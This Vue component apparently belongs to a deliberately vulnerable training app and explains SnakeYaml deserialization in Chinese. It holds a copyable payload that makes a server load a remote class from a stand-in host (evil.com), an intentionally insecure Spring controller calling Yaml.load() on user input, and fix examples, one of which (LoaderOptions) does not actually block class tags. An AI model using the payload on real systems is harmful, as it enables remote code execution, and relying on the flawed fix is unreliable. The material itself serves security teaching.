<template>
  <vuln-template
    title="SnakeYaml反序列化"
    subtitle="SnakeYaml Deserialization"
    level="严重"
    :icon="FileZipOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>SnakeYaml反序列化漏洞</strong>是指应用程序使用SnakeYaml解析不可信的YAML数据时可能触发代码执行。
      </a-typography-paragraph>
      <a-typography-paragraph>
        SnakeYaml反序列化漏洞的危害：
      </a-typography-paragraph>
      <ul>
        <li>通过构造恶意YAML触发代码执行</li>
        <li>远程代码执行</li>
        <li>完全控制服务器</li>
      </ul>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的SnakeYaml攻击payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://evil.com/&quot;]]]]
      </a-typography-paragraph>
    </template>

    <template #test-form>
      <div class="yaml-process-container">
        <a-card title="YAML配置解析服务" :bordered="false" style="margin-bottom: 24px;">
          <a-typography-paragraph>
            输入YAML格式的配置文件，系统将为您解析和处理。
          </a-typography-paragraph>
        </a-card>
        
        <a-form :model="formState" @finish="handleSubmit" layout="vertical">
          <a-form-item
            label="YAML配置"
            name="content"
            :rules="[{ required: true, message: '请输入YAML配置' }]"
          >
            <a-textarea
              v-model:value="formState.content" :rows="6"
              size="large"
              placeholder="输入YAML格式的配置数据"
            />
          </a-form-item>

          <a-form-item>
            <a-space>
              <a-button type="primary" html-type="submit" size="large" :loading="loading">
                <template #icon><file-zip-outlined /></template>
                解析YAML
              </a-button>
              <a-button size="large" @click="handleReset">
                <template #icon><redo-outlined /></template>
                重置
              </a-button>
            </a-space>
          </a-form-item>
        </a-form>
      </div>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@Controller
@RequestMapping("/home/deserialize")
public class YamlLoad {
    @RequestMapping("/yaml")
    public String yaml(String content, Model model) {
        try {
            // 漏洞：直接使用Yaml.load()解析用户输入的YAML
            // SnakeYaml默认允许反序列化任意类，攻击者可以通过!!java语法指定类名
            Yaml y = new Yaml();
            y.load(content); // 反序列化，可能触发代码执行
            model.addAttribute("results", "执行成功！");
        } catch (Exception e) {
            model.addAttribute("results", e.toString());
        }
        return "deserialize/yaml";
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：SnakeYaml的load()方法默认允许反序列化任意类。攻击者可以使用!!java语法指定类名（如!!javax.script.ScriptEngineManager），配合URLClassLoader加载远程恶意类，实现远程代码执行。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>使用safeLoad：</strong>使用Yaml.safeLoad()替代load()，只解析基本类型</li>
        <li><strong>使用LoaderOptions：</strong>配置LoaderOptions限制可反序列化的类</li>
        <li><strong>输入验证：</strong>检查YAML是否包含!!java等危险语法</li>
        <li><strong>升级版本：</strong>使用较新版本的SnakeYaml</li>
        <li><strong>白名单机制：</strong>只允许预定义的YAML结构</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        Yaml y = new Yaml();
        y.load(content); // 允许反序列化任意类
// 攻击者可以输入: !!javax.script.ScriptEngineManager [...]</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：使用safeLoad（推荐）
        @RequestMapping("/yaml")
        public String yaml(String content) {
            Yaml y = new Yaml();
            // safeLoad只解析基本类型（Map、List、String、Number等），不会反序列化类
            Object obj = y.safeLoad(content);
            return "解析成功: " + obj.toString();
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：使用LoaderOptions限制
        import org.yaml.snakeyaml.LoaderOptions;
        
        @RequestMapping("/yaml")
        public String yaml(String content) {
            LoaderOptions options = new LoaderOptions();
            // 禁用自定义标签（!!java等）
            options.setAllowDuplicateKeys(false);
            options.setMaxAliasesForCollections(50);
            
            Yaml y = new Yaml(options);
            // 仍然需要配合输入验证
            Object obj = y.load(content);
            return "解析成功";
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：输入验证
        @RequestMapping("/yaml")
        public String yaml(String content) {
            // 检查是否包含危险语法
            if (content.contains("!!java") || content.contains("!!javax")) {
                throw new SecurityException("不允许Java类反序列化");
            }
            
            Yaml y = new Yaml();
            Object obj = y.safeLoad(content); // 使用safeLoad
            return "解析成功";
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：使用YAML解析库的替代方案
        // 如果只需要解析配置，使用更安全的库
        import org.yaml.snakeyaml.Yaml;
        import java.util.Map;
        
        Yaml y = new Yaml();
        // 明确指定类型为Map，避免反序列化任意类
Map&lt;String, Object&gt; config = y.loadAs(content, Map.class);</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { FileZipOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@Controller
@RequestMapping("/home/deserialize")
public class YamlLoad {
    @RequestMapping("/yaml")
    public String yaml(String content, Model model) {
        try {
            // 漏洞：直接使用Yaml.load()解析用户输入的YAML
            // SnakeYaml默认允许反序列化任意类，攻击者可以通过!!java语法指定类名
            Yaml y = new Yaml();
            y.load(content); // 反序列化，可能触发代码执行
            model.addAttribute("results", "执行成功！");
        } catch (Exception e) {
            model.addAttribute("results", e.toString());
        }
        return "deserialize/yaml";
    }
}`

const fixCode1 = `// 错误示例(易受攻击)
Yaml y = new Yaml();
y.load(content); // 允许反序列化任意类
// 攻击者可以输入: !!javax.script.ScriptEngineManager [...]`

const fixCode2 = `// 正确示例1：使用safeLoad（推荐）
@RequestMapping("/yaml")
public String yaml(String content) {
    Yaml y = new Yaml();
    // safeLoad只解析基本类型（Map、List、String、Number等），不会反序列化类
    Object obj = y.safeLoad(content);
    return "解析成功: " + obj.toString();
}`

const fixCode3 = `// 正确示例2：使用LoaderOptions限制
import org.yaml.snakeyaml.LoaderOptions;

@RequestMapping("/yaml")
public String yaml(String content) {
    LoaderOptions options = new LoaderOptions();
    // 禁用自定义标签（!!java等）
    options.setAllowDuplicateKeys(false);
    options.setMaxAliasesForCollections(50);
    
    Yaml y = new Yaml(options);
    // 仍然需要配合输入验证
    Object obj = y.load(content);
    return "解析成功";
}`

const fixCode4 = `// 正确示例3：输入验证
@RequestMapping("/yaml")
public String yaml(String content) {
    // 检查是否包含危险语法
    if (content.contains("!!java") || content.contains("!!javax")) {
        throw new SecurityException("不允许Java类反序列化");
    }
    
    Yaml y = new Yaml();
    Object obj = y.safeLoad(content); // 使用safeLoad
    return "解析成功";
}`

const fixCode5 = `// 正确示例4：使用YAML解析库的替代方案
// 如果只需要解析配置，使用更安全的库
import org.yaml.snakeyaml.Yaml;
import java.util.Map;

Yaml y = new Yaml();
// 明确指定类型为Map，避免反序列化任意类
Map<String, Object> config = y.loadAs(content, Map.class);`

const formState = reactive({
  content: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/deserialize/yaml', {
      params: formState
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.content = ''
  result.value = ''
}
</script>
